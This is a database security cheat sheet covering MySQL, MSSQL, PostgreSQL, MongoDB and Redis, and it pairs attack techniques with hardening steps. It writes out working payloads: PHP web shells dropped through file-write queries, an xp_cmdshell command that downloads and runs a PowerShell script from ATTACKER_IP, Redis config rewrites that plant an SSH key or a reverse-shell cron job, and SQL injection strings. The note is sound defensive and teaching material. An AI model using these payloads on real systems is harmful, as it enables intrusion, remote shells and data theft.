---
title: Database Security Reference
tags:
  - reference
  - database
  - SQL
  - MySQL
  - PostgreSQL
  - MSSQL
  - MongoDB
  - security
  - cheat-sheet
  - intermediate
created: 2026-03-26
updated: 2026-03-26
source: CIS MySQL/MSSQL Benchmarks, OWASP SQL Injection Prevention Cheat Sheet,
  official vendor docs
difficulty: intermediate
---

# 🗄️ Database Security Reference

## Overview
Databases are among the most targeted systems in any environment — they store credentials, PII, financial data, and intellectual property. This note covers security-relevant commands, common misconfigurations, attack patterns, and hardening for the most widely used database systems.

---

## MySQL / MariaDB

### Reconnaissance
```bash
# Connect
mysql -u root -p -h TARGET_IP
mysql -u root -p                    # Local connection

# After connecting — key queries
SHOW DATABASES;
USE database_name;
SHOW TABLES;
DESCRIBE table_name;
SELECT user, host, authentication_string FROM mysql.user;   -- List users
SHOW GRANTS FOR 'username'@'host';                          -- User privileges
SHOW VARIABLES LIKE 'secure_file_priv';                     -- File read/write path
SHOW VARIABLES LIKE 'have_ssl';                             -- SSL status
SELECT @@version;                                           -- Version
SELECT @@datadir;                                           -- Data directory
SELECT @@hostname;                                          -- Hostname
```

### Common Attack Vectors

**Read local files (requires FILE privilege):**
```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');
```

**Write files (requires FILE privilege + writable path):**
```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
-- Results in web shell if web root is writable
-- secure_file_priv must be empty or set to the target path
```

**User Defined Functions (UDF) — code execution:**
```sql
-- If lib_mysqludf_sys is installed (older systems):
SELECT sys_exec('id');
SELECT sys_eval('cat /etc/passwd');
```

### MySQL Hardening
```sql
-- Delete anonymous accounts
DELETE FROM mysql.user WHERE User='';

-- Remove remote root login
DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1', '::1');

-- Remove test database
DROP DATABASE IF EXISTS test;
DELETE FROM mysql.db WHERE Db='test' OR Db='test\\_%';

-- Apply changes
FLUSH PRIVILEGES;

-- Principle of least privilege — create limited user
CREATE USER 'appuser'@'localhost' IDENTIFIED BY 'StrongPassword!';
GRANT SELECT, INSERT, UPDATE, DELETE ON appdb.* TO 'appuser'@'localhost';
FLUSH PRIVILEGES;
```

```bash
# mysql_secure_installation — interactive hardening wizard
sudo mysql_secure_installation
# Run this on every new MySQL installation
```

---

## Microsoft SQL Server (MSSQL)

### Reconnaissance
```sql
-- Version
SELECT @@VERSION;

-- Current database and user
SELECT DB_NAME(); SELECT SYSTEM_USER; SELECT USER_NAME(); SELECT IS_SRVROLEMEMBER('sysadmin');

-- List databases
SELECT name FROM master.dbo.sysdatabases;

-- List tables in current DB
SELECT table_name FROM information_schema.tables WHERE table_type='BASE TABLE';

-- List users and roles
SELECT name, type_desc FROM sys.server_principals WHERE type IN ('S','U','G');
EXEC sp_helpsrvrolemember 'sysadmin';    -- Members of sysadmin role

-- Linked servers (lateral movement opportunities)
EXEC sp_linkedservers;
SELECT * FROM sys.servers;
```

### xp_cmdshell — OS Command Execution

`xp_cmdshell` is a stored procedure that executes OS commands as the SQL Server service account.

```sql
-- Check if enabled
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell';

-- Enable (requires sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER_IP/shell.ps1'')"';

-- Disable (hardening)
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
```

### Linked Server Exploitation
```sql
-- If a linked server exists, execute queries on it
SELECT * FROM OPENQUERY(LINKEDSERVER, 'SELECT @@VERSION');
EXEC ('xp_cmdshell ''whoami''') AT LINKEDSERVER;
```

### MSSQL Hardening
```sql
-- Disable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;

-- Disable Ole Automation Procedures
EXEC sp_configure 'Ole Automation Procedures', 0; RECONFIGURE;

-- Disable CLR Integration
EXEC sp_configure 'clr enabled', 0; RECONFIGURE;

-- Principle of least privilege — create limited login
CREATE LOGIN appuser WITH PASSWORD = 'StrongPassword!';
CREATE USER appuser FOR LOGIN appuser;
GRANT SELECT, INSERT, UPDATE, DELETE ON dbo.tablename TO appuser;

-- Audit: find accounts with sysadmin
EXEC sp_helpsrvrolemember 'sysadmin';
```

---

## PostgreSQL

### Reconnaissance
```bash
# Connect
psql -U postgres -h TARGET_IP -d database_name
psql -U postgres                   # Local connection

# Key queries
\list                              -- List databases
\connect database_name             -- Connect to database
\dt                                -- List tables
\du                                -- List users and roles
SELECT version();                  -- Version
SELECT current_user;               -- Current user
SELECT rolname, rolsuper, rolcreaterole FROM pg_roles;  -- All roles and privileges
SHOW data_directory;               -- Data directory
```

### PostgreSQL Code Execution

```sql
-- Copy command — write files (requires superuser)
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';

-- Large Object (lo) — read files
SELECT lo_import('/etc/passwd');
SELECT data FROM pg_largeobject WHERE loid = [oid];

-- COPY read file
CREATE TABLE temp_file (data text);
COPY temp_file FROM '/etc/passwd';
SELECT * FROM temp_file;
DROP TABLE temp_file;
```

### PostgreSQL Hardening
```sql
-- Revoke public schema access
REVOKE CREATE ON SCHEMA public FROM PUBLIC;

-- Create limited role
CREATE ROLE appuser WITH LOGIN PASSWORD 'StrongPassword!';
GRANT CONNECT ON DATABASE appdb TO appuser;
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO appuser;

-- Check pg_hba.conf — controls connection authentication
-- Location: SHOW hba_file;
-- Use md5 or scram-sha-256, not trust
```

---

## MongoDB

### Reconnaissance
```bash
# Connect (no auth by default on older versions)
mongo --host TARGET_IP
mongosh --host TARGET_IP

# Key commands
show dbs
use database_name
show collections
db.collection_name.find()            # Dump all documents
db.collection_name.find().limit(5)   # First 5 documents
db.getUsers()                        # List users (requires auth)
db.adminCommand({listDatabases: 1})  # List databases
```

### Common Misconfigurations
```bash
# Default — no auth required on older installations
# Check: listen on 0.0.0.0:27017 = internet-exposed if no firewall
mongo --host TARGET_IP:27017 --eval "db.adminCommand({listDatabases:1})"

# Shodan query for exposed MongoDB: port:27017 product:MongoDB
```

### MongoDB Hardening
```bash
# Enable authentication in /etc/mongod.conf
security:
  authorization: enabled

# Create admin user before enabling auth
use admin
db.createUser({
  user: "adminUser",
  pwd: "StrongPassword!",
  roles: [{role: "userAdminAnyDatabase", db: "admin"}]
})

# Bind to localhost only — in mongod.conf
net:
  bindIp: 127.0.0.1

# Enable TLS
net:
  tls:
    mode: requireTLS
    certificateKeyFile: /etc/ssl/mongodb.pem
```

---

## Redis

### Reconnaissance
```bash
# Connect (no auth by default)
redis-cli -h TARGET_IP
redis-cli -h TARGET_IP -p 6379

# Key commands
INFO server                 # Version, OS, config file path
INFO all                    # Everything
CONFIG GET *                # All config settings
CONFIG GET requirepass      # Check if password is set
KEYS *                      # List all keys (careful — blocks on large DBs)
DBSIZE                      # Number of keys
GET key_name                # Get value of a key
```

### Redis Code Execution via Config Rewrite

Redis can be configured to write its files — if accessible without auth, this enables RCE:

```bash
# Write SSH public key to root's authorized_keys
CONFIG SET dir /root/.ssh
CONFIG SET dbfilename authorized_keys
SET payload "\n\nssh-rsa AAAAB3NzaC1yc2E... attacker@machine\n\n"
BGSAVE

# Write a cron job
CONFIG SET dir /var/spool/cron
CONFIG SET dbfilename root
SET cron "\n\n* * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n\n"
BGSAVE
```

### Redis Hardening
```bash
# In /etc/redis/redis.conf
requirepass YourStrongPassword    # Enable authentication
bind 127.0.0.1                    # Bind to localhost only
rename-command CONFIG ""          # Disable CONFIG command
rename-command FLUSHALL ""        # Disable dangerous commands
protected-mode yes                # Refuse connections from non-loopback without auth
```

---

## SQL Injection Quick Reference (Attacker Testing)

See also: SQLmap, Web-Application-Testing, OWASP-Top-10

```sql
-- Detection payloads
'
''
' OR '1'='1
' AND '1'='2

-- MySQL UNION-based extraction
' UNION SELECT NULL,NULL,NULL-- -              -- Find column count
' UNION SELECT @@version,NULL,NULL-- -         -- Extract version
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- -
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT username,password,NULL FROM users-- -

-- Time-based blind (MySQL)
' AND SLEEP(5)-- -
' AND IF(1=1,SLEEP(5),0)-- -

-- Boolean-based blind
' AND 1=1-- -    (true)
' AND 1=2-- -    (false)
```

---

## Database Hardening Checklist

```
☐ Change default passwords for all built-in accounts
☐ Remove unused default databases and accounts
☐ Apply principle of least privilege — app accounts need only SELECT/INSERT/UPDATE/DELETE
☐ Bind to localhost or internal IP only — never 0.0.0.0 unless required
☐ Enable TLS for all client connections
☐ Enable audit logging (track who accessed what and when)
☐ Disable dangerous features (xp_cmdshell, FILE privilege, Redis CONFIG)
☐ Keep database software patched
☐ Firewall: only allow DB port from application servers, not from internet
☐ Encrypt data at rest (TDE for MSSQL, MySQL encryption, pgcrypto for PostgreSQL)
☐ Regular backups — encrypted, offsite, tested
☐ Scan for exposed databases on internet (Shodan: port:3306, port:5432, port:27017, port:6379)
```

---

## Related Notes
- SQLmap
- OWASP-Top-10
- Web-Application-Testing
- Linux-Commands
- Common-Ports

## References
- OWASP SQL Injection Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- CIS MySQL Benchmark: https://www.cisecurity.org/benchmark/mysql
- CIS Microsoft SQL Server Benchmark: https://www.cisecurity.org/benchmark/microsoft_sql_server
- PostgreSQL Security Documentation: https://www.postgresql.org/docs/current/security.html
- MongoDB Security Checklist: https://www.mongodb.com/docs/manual/administration/security-checklist/
- Redis Security Documentation: https://redis.io/docs/management/security/

---
<- [[Reference-MOC]]